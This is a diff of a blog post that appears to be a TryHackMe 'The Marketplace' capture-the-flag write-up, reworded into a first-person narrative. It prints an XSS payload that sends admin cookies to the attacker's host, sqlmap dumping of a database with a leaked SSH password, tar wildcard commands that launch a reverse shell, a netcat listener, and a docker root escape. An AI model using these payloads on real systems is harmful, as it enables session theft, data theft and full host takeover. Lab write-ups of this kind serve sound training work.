@@ -3,11 +3,11 @@ title: TryHackMe The Marketplace Writeup
 date: 2023-07-05T13:34:41.636Z
 description: My solution for the TryHackMe Room "The marketplace"
 ---
-T﻿his room is rated at medium difficulty and covers some interesting topics such as XSS (cross-site scripting), SQL Injection, and a couple of methods for privilege escalation. For me, the victim machine is at address `10.10.15.67`
+In this writeup, I will share my journey through the TryHackMe room "The Marketplace." This room offers a medium level of difficulty and delves into fascinating topics such as XSS (cross-site scripting), SQL Injection, and privilege escalation techniques. The target machine's IP address was `10.10.15.67`.
 
 ## R﻿econnaissance
 
-S﻿tarting with an `nmap`scan to find running services and open ports.
+To start, I conducted an nmap scan to discover the running services and open ports on the target machine.
 
 ```shell
 $ nmap -sV 10.10.15.67
@@ -24,50 +24,58 @@ PORT      STATE SERVICE VERSION
 ...
 ```
 
-F﻿rom this we can see that there is a web server running on the machine, as well and an OpenSSH instance. Let's start by taking a look at the web page .by navigating to `http://10.10.15.67` in a browser
+Upon analysis, I discovered an OpenSSH instance and a web server running nginx 1.19.2. Curiosity led me to explore the website hosted on <http://10.10.15.67>.
+
+## Website Exploration
 
 ![](/img/webpage.png)
 
-T﻿he website seems to be some sort of online marketplace (surprise, surprise). Poking around on the website uncovers the ability to log in or sign up to create an account. After signing up and logging in, there were some new options available to me: the ability to create a listing, and to view messages for my account. As well as this, there was a session cookie created with the name `token`. These session cookies are used by the browser in order to tell what user is logged in, in order to show them the correct content on the page.
+The website appeared to be an online marketplace. After signing up and logging in, I gained access to additional features, such as creating listings and viewing messages. I also noticed the presence of a session cookie named "token," which helps the browser identify the logged-in user in order to display personalized content based on user access level (for example).
 
-I﻿f we can somehow replace our own session token with one of an administrator or high-level user, we will likely be able to have some administrative options which may help us obtain a reverse shell on the machine. Let's try creating a listing. On the listing creation page, there is a simple form to input the title and content of the listing, we can try testing for XSS vulnerabilities by attempting to embed a textarea element into the page (in the content field). When we then view the listing, and a textarea field is present, we know that the site is vulnerable to XSS injection. 
+## Exploiting XSS Vulnerability
+
+My objective was to replace my session token with that of an administrator or a high-level user. By doing so, I hoped to unlock administrative options and potentially achieve a reverse shell on the target machine. To test for XSS vulnerabilities, I experimented by embedding a textarea element in the content field while creating a listing. If the website rendered the textarea field when viewing the listing, it would indicate a vulnerability to XSS injection.
 
 ![](/img/textarea.png)
 
 ![](/img/textareaworking.png)
 
-W﻿ith an XSS vulnerability present, we can create a malicious listing that will steal the user's cookie and send it to our web server (which we will set up shortly). When we use the "report listing to administrator" function on the website, the THM machine will automatically mimic an administrator navigating to the listing. With this, we will be able to steal their cookie.
+## Exploiting XSS and Cookie Stealing
+
+Utilizing the identified XSS vulnerability, I crafted a malicious listing capable of stealing the user's cookie and sending it to my web server (which I will set up shortly). Leveraging the "report listing to administrator" function, the THM machine simulated an administrator visiting the listing, allowing me to capture their cookie.
 
 F﻿irst, the cookie stealing payload:
 
 > `<script>fetch('http://<YOUR_MACHINE_IP>:8000/steal?cookie='+btoa(document.cookie));</script>`
 
-T﻿hen, the setup of the web server using python:
+To capture the stolen cookies, I set up a web server using Python on port 8000. The server listened for incoming requests and logged any stolen cookies.
 
 ```shell
 $ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-N﻿ow, let's submit the listing, and report it to the administrators.
+Next, I submitted the listing, and reported it to the administrators.
 
 ![](/img/listing.png)
 
 ![](/img/reported.png)
 
-I﻿f we look in our web server console, sure enough we got the cookie! We will need to base64 decode the cookie into order to get the administrator's token.
+When I looked in my web server, sure enough, I got the cookie! I then decoded it using the base64 tool in order to retrieve the decoded token.
 
 ![](/img/gotcookie.png)
 
-W﻿e can replace our token cookie with the administrator token by using any firefox or chrome "cookie editor" extension, and then reload the page.
+## Replacing Cookies and Gaining Access
 
-U﻿pon reloading the page, we are presented with another navbar link: "administration panel", which gives us a list of all of the current users in the application. We can click on these links and go to each individual user page, notice the URL parameters when fetching a user:
+With the administrator's cookie successfully captured, I used a Firefox or Chrome "cookie editor" extension to replace my token cookie with the administrator's token. After reloading the page, a new navbar link appeared, granting me access to the "administration panel," which provided a comprehensive list of all users in the application. I could click on each user's link, observing the URL parameters, which were presumably used to query an SQL database on the backend and retrieve user information.
 
 > **`h﻿ttp://10.10.15.67/admin?user=1`**
 
-T﻿he URL parameters are likely being used to query an SQL database and retrieve information about the user with the corresponding ID passed within the URL. After some playing around, I managed to get the application to give a MySQL syntax error, meaning that an SQL injection is present. Time for SQLMap!
+After some playing around, I managed to get the application to give a MySQL syntax error, meaning that an SQL injection vulnerability was present. Time for SQLMap!
 
-I﻿ won't dive into the details of the SQLMap tool in this writeup, as there are plenty of resources online. One thing to note is that you need to make sure you pass the cookie value to the tool when using it. Also ensure to use the delay argument, as not having it there meant that it didn't work (for me, at least).
+## Exploiting SQL Injection
+
+Recognizing the presence of an SQL injection vulnerability, I decided to utilize the SQLMap tool. I supplied the captured cookie value for authentication and included the delay argument to ensure successful exploitation of the vulnerability. (for some reason, without the delay argument, SQLMap did not work as expected)
 
 ```shell
 $ sqlmap -u "http://10.10.15.67/admin?user=3" \
@@ -77,7 +85,11 @@ $ sqlmap -u "http://10.10.15.67/admin?user=3" \
          --dump
 ```
 
-I﻿ have ommitted most output of the command, but the command dumped 3 database tables, one which contains all listing, one which contained username and password hashes (I tried to crack them with brute force, but they are salted with bcrypt), and other called "`messages`", which contained the following bit of vital information:
+The SQLMap command resulted in the extraction of three database tables, including listings, username and password hashes, and a table named "messages." I first tried brute-forcing the password hashes, but they were salted with bcrypt and I did not get anywhere. 
+
+## Extracting Vital Information
+
+Within the "messages" table, I stumbled upon a critical piece of information. A system-generated message addressed to user ID 3, belonging to "jake," alerted me to a weak SSH password and provided a temporary new password: "`@b_ENXkGYUCAv3zJ`."
 
 ```
 Hello!\r\nAn automated system has detected your SSH password is too weak
@@ -85,9 +97,7 @@ and needs to be changed. You have been generated a new temporary password.
 \r\nYour new password is: @b_ENXkGYUCAv3zJ 
 ```
 
-T﻿his message was sent to user with id `3`, which we can lookup in the users table and find out that it belongs to the user `jake`
-
-Let's now log in as Jake via SSH and get the user flag. Typing `sudo -l` will tell us what programs we can run and as what users - this is a good command to memorize for privilege escalation
+Once I have obtained Jake's temporary password, "@b_ENXkGYUCAv3zJ," I proceed to log in as Jake via SSH and retrieve the user flag. After entering the provided password and getting the first flag, I can proceed to check my sudo privileges and available programs by typing `sudo -l`:
 
 ```shell
 ssh jake@10.10.15.67
@@ -100,9 +110,11 @@ User jake may run the following commands on the-marketplace
   (michael) NOPASSWD: /opt/backups/backup.sh
 ```
 
- This tells us that our user (jake) can run the bash script at `/opt/backups/backup.sh` as the user `michael`
+ This command allowed me to see that my user (jake) can run the bash script at `/opt/backups/backup.sh` as the user `michael`
 
-Let's take a look at the bash script:
+## Privilege Escalation via Exploitation of `tar` Command
+
+I decided to look further into the bash script located at `/opt/backups/backup.sh`
 
 ```shell
 jake@10.10.15.67:/opt/backups$ cat backup.sh
@@ -111,7 +123,9 @@ echo "Backing up files...";
 tar cf /opt/backups/backup.tar *
 ```
 
-The script takes a backup of everything in the /opt/backup directory by using wildcard packing, after research online I found that this can be exploited ([reference](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)). It works by creating empty files in the backup directory which are actually named the same as command arguments for the `tar `command. For a full explanation of the exploit, read the reference, but below are the commands used.
+After conducting some online research, I discovered a potential privilege escalation opportunity related to the script that takes a backup of everything in the `/opt/backup` directory using wildcard packing. This method can be exploited by creating empty files in the backup directory with names corresponding to command arguments for the `tar` command. I came across a helpful reference ([link](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)) that provided a detailed explanation of this exploit.
+
+To take advantage of this vulnerability, I followed the steps outlined in the reference. Here are the commands I used:
 
 ```shell
 jake@10.10.15.67$ cat > /opt/backups/rev.sh << EOF
@@ -122,12 +136,11 @@ jake@10.10.15.67$ chmod 777 /opt/backups/rev.sh
 jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint=1"
 jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint-action=exec=sh rev.sh"
 jake@10.10.15.67$ cd /opt/backups; sudo -u michael /opt/backups/backup.sh
-
 ```
 
-Note: you will need to start a shell listener using `nc -lvp 5555`
+Omitted: I started a shell listener using `nc -lvp 5555`
 
-Now, in your shell, you should get a callback
+Then, in my shell, I received a callback and a prompt! I then did some digging into the `michael `user
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -138,12 +151,13 @@ michael@10.10.15.67:/opt/backups$ whoami
 michael
 michael@10.10.15.67:/opt/backups$ id
 uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
-
 ```
 
-From the `id `command, we can see michael is part of the docker group, let's look at GTFOBins for a docker root escalation. ([GTFOBins](https://gtfobins.github.io/gtfobins/docker/))
+## Docker Exploitation
 
-A good thing to always do when you have a 'crappy' shell over netcat is to upgrade it (make interactive). In fact, the docker exploit will not work if the input device is not a TTY. Commands to upgrade the shell are as follows:
+From the `id`command, I noticed that `michael `is part of the `docker `group. After taking a quick look at GTFOBins for a docker root escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/docker/)), I found one that would result in a root shell, which was perfect for me.
+
+One thing I always like to do when I have a 'crappy' shell over netcat, is to upgrade it (make it properly interactive). In fact, the docker exploit will not work if the input device is not a TTY. The commands I used to upgrade the netcat shell are as follows:
 
 ```shell
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -153,13 +167,13 @@ $ stty raw -echo; fg
 export TERM=xterm-256color
 ```
 
-GTFObins gives us the following command: 
+GTFObins gave me the following command: 
 
 ```shell
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-Let's run that, and we get a root shell!
+I ran that command, and got a root shell! Then I just extracted the root flag and submitted it.
 
 ```
 michael@the-marketplace$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -170,4 +184,6 @@ root
 THM{d4f76179c80c0dcf46e0f8e43c9abd62}
 ```
 
-Kind of an easy win for the root flag, I would have liked something more challenging but we will take it!
+## Conclusion
+
+"The Marketplace" room from TryHackMe was good for learning - XSS is a crucial skill and being able to locate and execute a successful attack is important. By exploiting an SQL injection vulnerability, I was able to gain access to the system and uncover further escalate my privileges. One complaint I have for this room is the root privilege escalation - it was too easy. Copying payloads from GTFOBins is too easy of a win!
